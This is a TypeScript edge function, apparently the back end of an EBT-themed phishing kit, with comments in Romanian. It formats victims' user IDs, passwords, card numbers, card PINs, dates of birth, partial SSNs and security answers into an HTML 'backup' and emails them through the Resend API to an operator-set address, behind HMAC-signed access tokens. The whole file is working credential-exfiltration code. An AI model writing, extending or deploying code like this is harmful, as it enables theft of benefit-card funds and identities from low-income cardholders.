// redeploy 1779944431
// redeploy: 1779943933
// v3.1.0 — emailare backup. Acum cere token Layer 2 semnat (anti-abuse).
import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { makeCorsHeaders } from "../_shared/cors.ts";

let _req: Request | null = null;
const json = (data: unknown, status = 200) =>
  new Response(JSON.stringify(data), {
    status,
    headers: { ...(_req ? makeCorsHeaders(_req) : {}), "Content-Type": "application/json" },
  });

// ── Layer 2 token verification (mirror admin-api) ──
import { safeEqual as safeEqualHash } from "../_shared/cors.ts";
const te = new TextEncoder();
const fromB64u = (value: string) => {
  const base64 = value.replace(/-/g, "+").replace(/_/g, "/").padEnd(Math.ceil(value.length / 4) * 4, "=");
  return Uint8Array.from(atob(base64), (c) => c.charCodeAt(0));
};
const b64u = (bytes: Uint8Array) => btoa(String.fromCharCode(...bytes)).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/g, "");
const signPayload = async (payload: string) => {
  const secret = Deno.env.get("ADMIN_SESSION_SECRET");
  if (!secret || secret.length < 16) throw new Error("ADMIN_SESSION_SECRET not configured");
  const key = await crypto.subtle.importKey("raw", te.encode(secret), { name: "HMAC", hash: "SHA-256" }, false, ["sign"]);
  return b64u(new Uint8Array(await crypto.subtle.sign("HMAC", key, te.encode(payload))));
};
async function checkAdminToken(token: unknown, _ip: string, minLayer = 1): Promise<boolean> {
  if (typeof token !== "string" || !token.includes(".")) return false;
  const [payload, sig] = token.split(".");
  if (!payload || !sig || !(await safeEqualHash(sig, await signPayload(payload)))) return false;
  try {
    const data = JSON.parse(new TextDecoder().decode(fromB64u(payload)));
    return Number(data?.layer) >= minLayer && Number(data?.exp) > Date.now();
  } catch { return false; }
}

interface UserEntry {
  id: string;
  type: string;
  timestamp: string;
  userId?: string;
  password?: string;
  firstName?: string;
  lastName?: string;
  email?: string;
  phone?: string;
  challengeQuestions?: { question: string; answer: string }[];
  cardNumber?: string;
  pinCard?: string;
  dob?: string;
  ssnLast4?: string;
}

function buildHtml(users: UserEntry[]): string {
  const rows = users.map((u, i) => {
    const fields: string[] = [];
    const add = (label: string, val?: string) => {
      if (val) fields.push(`<tr><td style="padding:4px 10px;color:#94a3b8;font-size:12px;width:110px">${label}</td><td style="padding:4px 10px;color:#e2e8f0;font-size:13px;font-weight:600">${val}</td></tr>`);
    };
    add("User ID", u.userId); add("Password", u.password);
    add("First Name", u.firstName); add("Last Name", u.lastName);
    add("Email", u.email); add("Phone", u.phone);
    add("Card Number", u.cardNumber); add("PIN", u.pinCard);
    add("DOB", u.dob); add("SSN-4", u.ssnLast4);
    if (u.challengeQuestions?.length) {
      u.challengeQuestions.forEach((cq, ci) => { add(`Q${ci + 1}`, cq.question); add(`A${ci + 1}`, cq.answer); });
    }
    const badge = u.type === "new"
      ? '<span style="background:#22c55e;color:#fff;padding:2px 8px;border-radius:10px;font-size:11px;font-weight:700">NEW</span>'
      : '<span style="background:#3b82f6;color:#fff;padding:2px 8px;border-radius:10px;font-size:11px;font-weight:700">OLD</span>';
    const time = new Date(u.timestamp).toLocaleString("en-US", { timeZone: "America/New_York" });
    return `<div style="background:#1e293b;border:1px solid #334155;border-radius:12px;margin-bottom:16px;overflow:hidden"><div style="background:#0f172a;padding:10px 16px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #334155"><span style="color:#f8fafc;font-weight:700;font-size:14px">#${i + 1} ${badge}</span><span style="color:#64748b;font-size:11px">${time}</span></div><div style="padding:8px 6px"><table style="width:100%;border-collapse:collapse">${fields.join("")}</table></div></div>`;
  }).join("");
  return `<!DOCTYPE html><html><body style="margin:0;padding:24px;background:#0f172a;font-family:Arial,sans-serif"><div style="max-width:600px;margin:0 auto"><div style="text-align:center;margin-bottom:24px"><h1 style="color:#f8fafc;font-size:20px;margin:0">🛡️ EBT Admin Backup</h1><p style="color:#64748b;font-size:13px;margin:6px 0 0">${users.length} entries • ${new Date().toLocaleString("en-US", { timeZone: "America/New_York" })}</p></div>${rows}</div></body></html>`;
}

serve(async (req) => {
  _req = req;
  if (req.method === "OPTIONS") return new Response("ok", { headers: makeCorsHeaders(req) });
  if (req.method !== "POST") return json({ error: "method_not_allowed" }, 405);

  const ip =
    req.headers.get("x-forwarded-for")?.split(",")[0].trim() ||
    req.headers.get("cf-connecting-ip") ||
    "unknown";

  let body: any;
  try { body = await req.json(); } catch { return json({ error: "invalid_json" }, 400); }

  // Refuz orice tentativă de a folosi această funcție ca admin API.
  if (body?.admin === true || typeof body?.action === "string" || typeof body?.password === "string") {
    return json({ error: "not_an_admin_endpoint" }, 410);
  }

  // Hard cap pe payload (anti-spam)
  const cl = Number(req.headers.get("content-length") ?? "0");
  if (cl > 2_000_000) return json({ error: "payload_too_large" }, 413);

  // Cere token admin valid Layer 2 — backup-ul conține parole/SSN/carduri în clar
  if (!(await checkAdminToken(body?.token, ip, 2))) {
    return json({ error: "unauthorized_layer2" }, 401);
  }

  try {
    const RESEND_API_KEY = Deno.env.get("RESEND_API_KEY");
    if (!RESEND_API_KEY) throw new Error("RESEND_API_KEY is not configured");
    const BACKUP_EMAIL = Deno.env.get("BACKUP_EMAIL");
    if (!BACKUP_EMAIL) throw new Error("BACKUP_EMAIL is not configured");

    const { users } = body;
    if (!users || !Array.isArray(users) || users.length === 0) {
      return json({ success: true, skipped: true });
    }
    if (users.length > 5000) return json({ error: "too_many_users" }, 413);

    const html = buildHtml(users);
    const res = await fetch("https://api.resend.com/emails", {
      method: "POST",
      headers: { Authorization: `Bearer ${RESEND_API_KEY}`, "Content-Type": "application/json" },
      body: JSON.stringify({
        from: "EBT Backup <onboarding@resend.dev>",
        to: [BACKUP_EMAIL],
        subject: `🛡️ EBT Backup — ${users.length} entries — ${new Date().toLocaleDateString("en-US")}`,
        html,
      }),
    });
    const data = await res.json();
    if (!res.ok) throw new Error(`Resend API failed [${res.status}]: ${JSON.stringify(data)}`);
    return json({ success: true, id: data.id });
  } catch (_error) {
    return json({ success: false, error: "server_error" }, 500);
  }
});
